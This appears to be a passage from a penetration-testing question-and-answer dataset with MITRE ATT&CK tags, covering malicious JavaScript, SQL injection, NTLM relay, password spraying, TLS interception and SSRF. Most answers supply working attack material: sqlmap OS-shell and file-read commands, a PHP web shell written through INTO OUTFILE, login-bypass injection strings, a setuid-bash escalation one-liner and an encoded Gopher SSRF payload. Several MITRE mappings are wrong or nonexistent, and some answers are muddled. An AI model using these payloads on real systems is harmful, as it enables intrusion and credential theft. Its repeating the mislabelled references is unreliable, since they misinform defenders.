This will create a malicious 'ncMalicious.exe' file that contains a Meterpreter payload. However, this technique is likely to be detected by antivirus software. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you create a malicious JavaScript file to automatically execute commands on a Windows system?
A: To create a malicious JavaScript file that can automatically execute commands on a Windows system, you can use the following code:

var oShell = new ActiveXObject("Shell.Application");
var commandtoRun = "C:\\Windows\\system32\\calc.exe";
oShell.ShellExecute(commandtoRun,"","","open","1");

This code creates a new ActiveX object to run shell commands, and then executes the 'calc.exe' program. You can modify this code to download and execute any script or executable file on the target system. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use the Social Engineering Toolkit (SET) to conduct phishing attacks?
A: The Social Engineering Toolkit (SET) is a common tool used to conduct phishing attacks. To use SET, simply run the following command:

setoolkit

This will launch the SET tool, which provides a variety of options for creating and deploying phishing attacks, including email phishing, website cloning, and more. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can you embed a malicious executable inside a PowerPoint presentation to execute it upon opening?
A: To embed a malicious executable inside a PowerPoint presentation, you can use tools and techniques to package the executable within the presentation. This allows the malicious code to execute when the victim opens the presentation. However, this type of attack may be detected by security software, and should only be attempted with the appropriate permissions and authorization. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you exploit the Python socket example to gain a root shell?
A: You can exploit the Python socket example to gain a root shell by sending a command that copies a setuid bash binary to `/tmp/bash` and makes it executable. The command to do this is: `echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s`. This will create a setuid root bash shell at `/tmp/bash` that can be used to escalate privileges. MITRE References: MITRE ID is T1106, MITRE Name is: Execution through Module Load, and MITRE Tactics are: Execution.

## Q: What tool can be used to generate a PoC to exploit a SOME vulnerability?
A: You can use the form at <https://www.someattack.com/Playground/SOMEGenerator> to generate a PoC to exploit a SOME vulnerability. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: Where can you find a vulnerable example of a SOME attack?
A: You can find a vulnerable example at <https://www.someattack.com/Playground/>. Note that in this example, the server is generating JavaScript code and adding it to the HTML based on the content of the callback parameter, which is why you don't need to indicate the use of `opener` explicitly. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: What HTTP headers can be used to rewrite the IP source?
A: Rewrite IP source:
* `X-Originating-IP: 127.0.0.1`
* `X-Forwarded-For: 127.0.0.1`
* `X-Forwarded: 127.0.0.1`
* `Forwarded-For: 127.0.0.1`
* `X-Forwarded-Host: 127.0.0.1`
* `X-Remote-IP: 127.0.0.1`
* `X-Remote-Addr: 127.0.0.1`
* `X-ProxyUser-Ip: 127.0.0.1`
* `X-Original-URL: 127.0.0.1`
* `Client-IP: 127.0.0.1`
* `X-Client-IP: 127.0.0.1`
* `X-Host: 127.0.0.1`
* `True-Client-IP: 127.0.0.1`
* `Cluster-Client-IP: 127.0.0.1`
* `Via: 1.0 fred, 1.1 127.0.0.1`
* `Connection: close, X-Forwarded-For` (Check hop-by-hop headers) MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion, Execution, Persistence.

## Q: What kind of tricks can be used to hide or extract information from PNG files?
A: PNG files can be used to hide information through techniques like steganography. Tools like `pngmeta` or `pngcheck` can be used to inspect the metadata and structure of PNG files, while tools like `zsteg` can be used to detect and extract hidden data within the image. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: What kind of tricks can be used to analyze and extract information from ZIP files?
A: ZIP files can be inspected using tools like `binwalk` or `7zip` to identify and extract any embedded files, scripts, or other potentially malicious content. Additionally, tools like `zipdump` can be used to analyze the structure and metadata of ZIP archives. MITRE References: MITRE ID is T1560, MITRE Name is: Archive Collected Data, and MITRE Tactics are: Collection.

## Q: How can the spectool_net utility be leveraged during a penetration test to remotely access wireless spectrum data?
A: The spectool_net utility in spectools can be used to set up a network server to remotely access wireless spectrum data from Wi-Spy hardware. This allows the Wi-Spy hardware to be deployed in one location while the data is accessed from a remote system. The spectool_net tool can be configured to bind to a specific IP address and port, and it supports broadcasting its availability on the network. The spectool_gtk program can then be used to connect to the remote spectool_net server and analyze the captured wireless data (version 201601r1-3). MITRE References: MITRE ID is T1135, MITRE Name is: Network Share Discovery, and MITRE Tactics are: Discovery.

## Q: How can Splunk Universal Forwarder Agent be abused for remote code execution and persistence?
A: The Splunk Universal Forwarder Agent (UF) does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution. An attacker who obtains the UF agent password can utilize the Splunk API to send commands or scripts to the agents, potentially leading to system compromise with SYSTEM/root level permissions. This can result in full network compromise, data exfiltration, and the installation of backdoors or ransomware. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can Splunk queries be abused to execute arbitrary scripts?
A: The CVE-2023-46214 vulnerability allowed uploading an arbitrary script to `$SPLUNK_HOME/bin/scripts` and then executing it using the search query `|runshellscript script_name.sh`. This can be used to achieve remote code execution on Splunk servers. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can Responder be used to impersonate services?
A: Responder can be used to impersonate services by sending forged responses to hosts querying LLMNR, NBT-NS, and mDNS protocols. Further information on service impersonation using Responder can be found in the '/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks' page. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0006.

## Q: How can Responder be used for protocol poisoning?
A: Responder is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services. It comes pre-installed in Kali Linux, configurable at `/etc/responder/Responder.conf`. Responder displays captured hashes on the screen and saves them in the `/usr/share/responder/logs` directory. It supports both IPv4 and IPv6. The Windows version of Responder is available at https://github.com/lgandx/Responder-Windows. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: TA0006, TA0009.

## Q: How can Responder be used to capture credentials?
A: Responder will impersonate services using the above-mentioned protocols, capturing credentials (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the spoofed services. Attempts can be made to downgrade to NetNTLMv1 or disable ESS for easier credential cracking. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can an NTLM Relay Attack be performed?
A: This attack leverages SMB authentication sessions to access a target machine, granting a system shell if successful. The key prerequisites include the authenticating user having Local Admin access on the relayed host and SMB signing being disabled. To perform the attack in scenarios where direct network introduction isn't feasible, traffic on port 445 needs to be forwarded and tunneled using tools like PortBender. Other tools like Metasploit, smbrelayx, and MultiRelay can also be used to conduct NTLM Relay attacks, often configured to operate through a SOCKS proxy. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: TA0006, TA0009.

## Q: How can MultiRelay be used for NTLM Relay Attacks?
A: MultiRelay is executed from the `/usr/share/responder/tools` directory, targeting specific IPs or users. Examples of commands include:
`python MultiRelay.py -t <IP target> -u ALL # Relay all users`
`python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command`
`python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes`
Proxychains can be used for routing traffic if necessary. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: TA0006, TA0009.

## Q: How can privileged accounts be forced to authenticate to arbitrary machines in Windows?
A: In Windows, you may be able to force some privileged accounts to authenticate to arbitrary machines. Read the '/windows-hardening/active-directory-methodology/printers-spooler-service-abuse' page to learn how. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: TA0006.

## Q: What is the Evil SSDP tool and how can it be used for phishing attacks?
A: Evil SSDP effectively creates convincing fake UPnP devices, manipulating users into interacting with seemingly authentic services. Users, tricked by the genuine appearance, may provide sensitive information like credentials. The tool's versatility extends to various templates, mimicking services like scanners, Office365, and even password vaults, capitalizing on user trust and network visibility. Post credential capture, attackers can redirect victims to designated URLs, maintaining the deception's credibility. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: TA0002.

## Q: How can you spoof your location to bypass regional restrictions and install restricted apps on Android?
A: To spoof your location and bypass regional restrictions to install restricted apps on Android:1. Install Hotspot Shield Free VPN Proxy from the Google Play Store.2. Open the Hotspot Shield app and connect to a VPN server in a country where the restricted app is available.3. Navigate to your device's Settings > Apps or Application Manager, find the Google Play Store app, and tap 'Force Stop' and 'Clear Data' to reset it.4. Open the Google Play Store, which should now reflect the content of the country you connected to via VPN. You should be able to search for and install the previously restricted app. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion, Initial Access.

## Q: How can you use the spray tool to perform password spraying attacks against Active Directory credentials?
A: The spray tool can be used to perform password spraying attacks against Active Directory credentials. The usage is as follows:
spray -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>
This will spray the provided username and password list against the target IP address and Active Directory domain, respecting the password policy to avoid account lockouts. The tool includes a series of pre-crafted password lists in multiple languages to use for these attacks. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use the spray tool to perform password spraying attacks against Outlook Web Access (OWA)?
A: The spray tool can also be used to perform password spraying attacks against Outlook Web Access (OWA) portals. The usage is as follows:
spray -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestFile>
This requires creating a file containing the POST request with the username and password to be used in the attack, and providing that file as the <RequestFile> argument. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use the spray tool to perform password spraying attacks against Lync services?
A: The spray tool can be used to perform password spraying attacks against Lync services. The usage is as follows:
spray -lync <lyncDiscoverOrAutodiscoverUrl> <emailAddressList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>
This requires providing either a Lync Autodiscover URL or a URL that returns the www-authenticate header, along with a list of email addresses and the password list to use in the attack. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use the spray tool to perform password spraying attacks against Cisco Web VPN portals?
A: The spray tool can be used to perform password spraying attacks against Cisco Web VPN portals. The usage is as follows:
spray -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>
This requires providing the target URL of the Cisco Web VPN portal, along with the username and password lists to use in the attack. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can the sprayingtoolkit be used to perform a password spraying attack against OWA?
A: The sprayingtoolkit includes a tool called 'atomizer' that can be used to perform password spraying attacks against OWA. To use it, run the following command:

```atomizer owa <target> <password> <userfile> [--targetPort PORT] [--threads THREADS] [--debug]```This will spray the single password against the list of usernames in the specified userfile against the OWA target. You can also use a passwordfile and spray the passwords at a specified interval using the `--interval` option.Version: 0.0~git20201009.68f295d-0kali1 MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can the sprayingtoolkit be used to generate usernames for a password spraying attack?
A: The sprayingtoolkit includes a tool called 'spindrift' that can be used to generate usernames for a password spraying attack. To use it, run the following command:```spindrift [<file>] [--target TARGET | --domain DOMAIN] [--format FORMAT]```This will generate usernames based on a provided list of names or the specified target domain. The `--format` option allows you to customize the username format, such as using the first initial and last name.Version: 0.0~git20201009.68f295d-0kali1 MITRE References: MITRE ID is T1586, MITRE Name is: Compromise Software Supply Chain, and MITRE Tactics are: Resource Development.

## Q: What other Spring Boot Actuator settings can be manipulated for exploitation?
A: Properties like `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, and `spring.datasource.tomcat.max-active` can be manipulated for various exploits, such as SQL injection or altering database connection strings. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can sqldict be used to perform a dictionary attack on SQL Server credentials?
A: sqldict version 2.1-1kali5 is a tool that can be used to perform dictionary attacks on SQL Server credentials. To use it, first ensure the wine32 package is installed. Then, run the sqldict command and it will prompt you for the target IP address, username, and password dictionary file. It will then attempt to brute-force the SQL Server credentials using the provided password dictionary. This can be useful for penetration testing or CTF events when trying to gain access to SQL Server instances. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can sqlitebrowser be used to extract database passwords from SQLite databases?
A: Sqlitebrowser can be used to browse and view the contents of SQLite databases, including any stored passwords or other sensitive information. To do this, open the target SQLite database file in sqlitebrowser, navigate to the table containing the password data, and view the contents directly. This allows you to extract any plaintext or hashed passwords stored in the database. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: What techniques can be used with sqlitebrowser to attempt SQL injection attacks against web applications that use SQLite databases?
A: Sqlitebrowser can be used to craft SQL injection payloads and test them against web applications that use SQLite databases. Open the target database in sqlitebrowser, navigate to the tables and columns, and craft SQL queries with injection vectors. You can then use sqlitebrowser to execute these queries and attempt to dump sensitive data from the database. Version 3.12.2 of sqlitebrowser supports this functionality. MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: Defense Evasion.

## Q: How can you get a list of passwords for the users in the database with SQLmap?
A: To get a list of passwords for the users in the database with SQLmap, you can use the `--passwords` option. For example, the command would be: `sqlmap -u "http://example.com/?id=1" --passwords`. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Credential Access, Exfiltration.

## Q: How can you perform a SQL injection in a GET request with SQLmap?
A: To perform a SQL injection in a GET request with SQLmap, you can use the `-u` and `-p` options. For example, the command would be: `sqlmap -u "http://example.com/?id=1" -p id`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you perform a SQL injection in a POST request with SQLmap?
A: To perform a SQL injection in a POST request with SQLmap, you can use the `-u` and `--data` options. For example, the command would be: `sqlmap -u "http://example.com" --data "username=*&password=*"`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you perform a SQL injection in headers or other HTTP methods with SQLmap?
A: To perform a SQL injection in headers or other HTTP methods with SQLmap, you can use the `--headers` and `--method` options. For example, to inject in a cookie header: `sqlmap -u "http://example.com" --cookie "mycookies=*"`; to inject in a referer header: `sqlmap -u "http://example.com" --headers="referer:*"`; and to use the PUT method: `sqlmap --method=PUT -u "http://example.com" --headers="referer:*"`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you execute commands on the target system with SQLmap?
A: To execute commands on the target system with SQLmap, you can use the `--os-cmd` option to run a single command, or the `--os-shell` option to get a shell. For example, to execute the `whoami` command: `sqlmap -u "http://example.com/?id=1" -p id --os-cmd whoami`; and to get a shell: `sqlmap -u "http://example.com/?id=1" -p id --os-shell`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you read a file on the target system with SQLmap?
A: To read a file on the target system with SQLmap, you can use the `--file-read` option. For example, the command to read the `/etc/passwd` file would be: `sqlmap -u "http://example.com/?id=1" -p id --file-read=/etc/passwd`. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection, Exfiltration.

## Q: How can you crawl a website and automatically exploit vulnerabilities with SQLmap?
A: To crawl a website and automatically exploit vulnerabilities with SQLmap, you can use the `--crawl`, `--forms`, `--threads`, `--level`, and `--risk` options. For example, the command would be: `sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3`. MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can you perform a second-order SQL injection with SQLmap?
A: To perform a second-order SQL injection with SQLmap, you can use the `--second-order` option. For example, the command would be: `sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3`. MITRE References: MITRE ID is T1559, MITRE Name is: Inter-Process Communication, and MITRE Tactics are: Execution, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can sqlninja be used to escalate privileges on a target system after a successful SQL injection attack?
A: After confirming a successful SQL injection, sqlninja can be used to escalate privileges by adding the current user to the sysadmin server role (-m e). This effectively gives the attacker administrative access to the database server. For example:

```consoleroot@kali:~# sqlninja -m e -f /root/sqlninja.conf -p MyPassword123Sqlninja rel. 0.2.6-r1Copyright (C) 2006-2011 icesurfer <r00t@northernfortress.net>[+] Parsing /root/sqlninja.conf...[+] Target is: 192.168.1.51:80[+] Trying to add the current user to the sysadmin server role...[+] User added to the sysadmin server role!``` MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Initial Access.

## Q: How can sqlninja be used to upload a malicious .scr file to the target system after a successful SQL injection attack?
A: Sqlninja can be used to upload a malicious .scr file to the target system in the 'upload' mode (-m u). This can be useful for gaining further access to the system after a successful SQL injection. For example:

```consoleroot@kali:~# sqlninja -m u -f /root/sqlninja.conf -gSqlninja rel. 0.2.6-r1Copyright (C) 2006-2011 icesurfer <r00t@northernfortress.net>[+] Parsing /root/sqlninja.conf...[+] Target is: 192.168.1.51:80[+] Generating debug script and exiting...```

The `-g` option will generate a debug script that can be used to manually upload the malicious .scr file. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can sqlsus be used for SQL injection attacks?
A: sqlsus can be used to perform SQL injection attacks by allowing you to inject custom SQL queries into a target database. The tool can retrieve the database structure, download files from the web server, and even upload a backdoor. To use sqlsus for SQL injection, start by generating a configuration file with `sqlsus -g sqlsus.cfg`, then edit the file and run `sqlsus sqlsus.cfg` to start the session. From there, you can execute SQL injection commands to enumerate the database and potentially gain access. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you exploit a union-based SQL injection?
A: If you can see the output of the query, you can exploit a union-based SQL injection by first determining the number of columns the initial request is returning. This can be done by incrementally adjusting the number used in ORDER BY or GROUP BY clauses until a false response is received. Once the number of columns is known, you can use a UNION SELECT statement to retrieve database names, table names, and column names. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0009.

## Q: How can you exploit a blind SQL injection vulnerability?
A: In a blind SQL injection scenario, where you cannot see the output of the query or any error messages, you can still exploit the vulnerability by leveraging techniques like:- Conditional responses: Crafting queries that return different responses based on whether the query is true or false- Time-based: Making the database perform time-consuming operations and observing the response time- Out-of-band: Forcing the database to send information to a server you control, e.g. via DNS queriesThese techniques allow you to slowly extract information from the database by guessing characters or making inferences. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0009.

## Q: How can you bypass a Web Application Firewall (WAF) when exploiting a SQL injection vulnerability?
A: There are several techniques to bypass WAF protections when exploiting SQL injection vulnerabilities:- Use whitespace alternatives like tab, newline, or null byte instead of spaces- Use comments to obfuscate keywords- Leverage parentheses or other logical operators instead of keywords- Replace commas with alternative constructs like OFFSET, FROM, or JOIN- Use uppercase/lowercase variations of keywords- Employ scientific notation to bypass number restrictionsAdditionally, there are WAF bypass suggester tools available that can help identify effective payloads for a given context. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, TA0009.

## Q: How can SQL-injection be performed manually?
A: The two main ways for perform a SQL-injection: **error based** or **blind**.

### Error-bases DB enumeration

If we manage to find an error-message after a broken SQL-query, we can use that to try to map out the database structure.

#### Step 1 - Add the tick '

So first we should try to break the SQL-syntax by adding a `'`.

```
http://example.com/photoalbum.php?id=1'
```

If the page then returns a blank page or a page with a SQL-error we know that the page it vulnerable.

#### Step 2 - Enumerate columns

So in order to enumerate the columns of a table we can use the **order by**

```
# This trhows no error
http://example.com/photoalbum.php?id=1 order by 9
# This throws error
http://example.com/photoalbum.php?id=1 order by 10
```

#### Step 3 - Find space to output db

Now we need to know which columns are being outputed on the webpage. We can use the **union select** command for this.

```
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9
```

#### Step 4 - Start enumerating the database

Now we can use the column numbers to start outputing data.

```
# Get username of the sql-user
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9
```

### Blind sql-injection

We can also use the `sleep()` function to check if our injected commands are processed correctly. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you get a shell from a SQL-injection vulnerability?
A: The good part about MySQL from a hacker-perspective is that you can actually use SQL to write files to the system. This will let us write a backdoor to the system that we can use.

#### Load files

```
UNION SELECT 1, load_file(/etc/passwd) #
```

#### Write files

```
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

#### MSSQL - xp_cmdshell

You can run commands straight from the SQL-query in MSSQL. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: What are some payloads to bypass the login via XPath, LDAP and SQL injection?
A: This list contains payloads to bypass the login via XPath, LDAP and SQL injection(in that order). The way to use this list is to put the first 200 lines as the username and password. Then, put the complete list in the username first and then in the password inputs while putting some password (like Pass1234.) or some known username (like admin). MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you use the OR operator to bypass login forms in a SQL injection attack?
A: You can use the OR operator to bypass login forms in a SQL injection attack. For example, `' or '1'='1`, `' or ''='`, `' or 1]%00`, `' or /* or '`, `' or "a" or '`, `' or 1 or '`, and `' or true() or '` can be used to bypass the login. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you use the LIKE operator to bypass login forms in a SQL injection attack?
A: You can use the LIKE operator to bypass login forms in a SQL injection attack. For example, `' or userid like '%`, `' or uname like '%`, `' or username like '%`, and `' or user like '%` can be used to bypass the login. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you use URL encoding to bypass login forms in a SQL injection attack?
A: You can use URL encoding to bypass login forms in a SQL injection attack. For example, `%A8%27 Or 1=1-- 2`, `%8C%A8%27 Or 1=1-- 2`, `%bf' Or 1=1 -- 2`, and similar payloads can be used to bypass the login. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0001.

## Q: How can you use SROP to execute a shell?
A: You can construct a call to `sigreturn` via ROP, putting the value `0xf` in the `rax` register. This will allow you to set other registers like `rdi`, `rsi`, and `rdx` to the appropriate values to call `execve('/bin/sh', NULL, NULL)`. The `sigcontext` structure stored on the stack is used to recover the register values and control the execution flow. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How could sslh be used to evade firewall restrictions and establish a secure connection?
A: sslh v1.22c can be used to bypass firewalls by accepting connections on port 443 (typically allowed for HTTPS) and then forwarding the traffic to an SSH, OpenVPN, or other protocol server. This allows establishing a secure connection even in restrictive network environments. To use sslh, you would configure it to listen on port 443 and forward to the appropriate backend service. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Command and Control.

## Q: How can sslsniff be used to perform silent interceptions of SSL/TLS connections?
A: sslsniff version 0.8-9 supports other attacks like null-prefix or OCSP attacks to achieve silent interceptions of SSL/TLS connections. To use these silent interception techniques, run sslsniff with the '-d' option to deny OCSP requests for the generated certificates. MITRE References: MITRE ID is T1920, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can sslsniff be used to intercept Mozilla addon updates?
A: sslsniff version 0.8-9 can be used to intercept Mozilla addon updates. To do this, run sslsniff with the '-e' option to specify the URL to intercept, and the '-j' option to specify the SHA256 sum of the addon to inject. MITRE References: MITRE ID is T1491.001, MITRE Name is: Defacement: Network Defacement, and MITRE Tactics are: Impact.

## Q: How can sslsplit be used to perform a man-in-the-middle attack against SSL/TLS connections?
A: SSLsplit can be used to transparently intercept and inspect SSL/TLS encrypted connections. It does this by acting as a proxy and terminating the SSL/TLS connection on both ends, allowing the traffic to be logged and monitored. To use sslsplit for a MITM attack, you can run it with the following options:

sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

This runs sslsplit in debug mode (-D), logs the connections to connections.log (-l), sets a chroot jail (-j), saves log files to /tmp/ (-S), specifies the CA key (-k) and cert (-c), and sets up a SSL proxy on 0.0.0.0:8443 that forwards to 0.0.0.0:8080. The CA cert and key are used to sign forged SSL certificates for the target hosts. MITRE References: MITRE ID is T1217, MITRE Name is: Man-in-the-Middle, and MITRE Tactics are: TA0006, TA0011.

## Q: How can sslsplit be used to capture SSL/TLS master keys for decryption?
A: SSLsplit can be used to capture the master keys for SSL/TLS connections, allowing the encrypted traffic to be decrypted offline. To do this, run sslsplit with the -M option to log the master keys to a file in the SSLKEYLOGFILE format:

sslsplit -M masterkeys.log -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

This will write the master keys to the masterkeys.log file, which can then be used with tools like Wireshark to decrypt the intercepted SSL/TLS traffic. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: TA0006, TA0009.

## Q: How can sslstrip be used to conduct a man-in-the-middle attack and steal user credentials?
A: sslstrip v1.0 can be used to conduct a man-in-the-middle (MITM) attack and steal user credentials by hijacking HTTP traffic and mapping HTTPS links to look-alike HTTP links. This allows the attacker to intercept and log all traffic, including login credentials, between the victim and the server. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006.

## Q: What technique can be used to bypass HTTPS alerts when intercepting user traffic?
A: To bypass HTTPS alerts when intercepting user traffic, you can remove the SSL part of every request. This will change the URL from HTTPS to HTTP, making it less likely that the user will notice the change in the URL bar. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Defense Evasion, Lateral Movement.

## Q: How can you bypass a whitelist of allowed domains or URLs for an SSRF vulnerability?
A: You can try techniques like using URL format bypass (e.g. using IP addresses, different URL schemes, URL encoding, etc.) to bypass the whitelist restrictions. Additionally, if the server is following redirects, you could try to exploit an open redirect inside the web page to bypass the restrictions. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use the Gopher protocol to communicate with other TCP servers when exploiting an SSRF vulnerability?
A: The Gopher protocol allows you to specify the IP, port, and bytes you want the server to send. You can use tools like Gopherus to create payloads for various services, or remote-method-guesser to create Gopher payloads for Java RMI services. For example, to send an SMTP payload, you can use: `gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use the Referrer header or Server Name Indication (SNI) data to exploit an SSRF vulnerability?
A: Analytics software on servers often logs the Referrer header, which can expose SSRF vulnerabilities. You can use the Burp Suite plugin "Collaborator Everywhere" to identify potential SSRF attack surfaces. Additionally, a misconfigured Nginx server that uses the Server Name Indication (SNI) field as the backend address can be exploited for SSRF by specifying the desired IP address or domain name in the SNI field. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use SSRF to cause a Denial of Service (DoS) attack?
A: To cause a Denial of Service (DoS) using SSRF, you can create several sessions and try to download heavy files exploiting the SSRF from the sessions. This will put a strain on the server's resources and potentially cause a DoS. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you use SSRF to obtain information about the cloud environment and potentially obtain credentials?
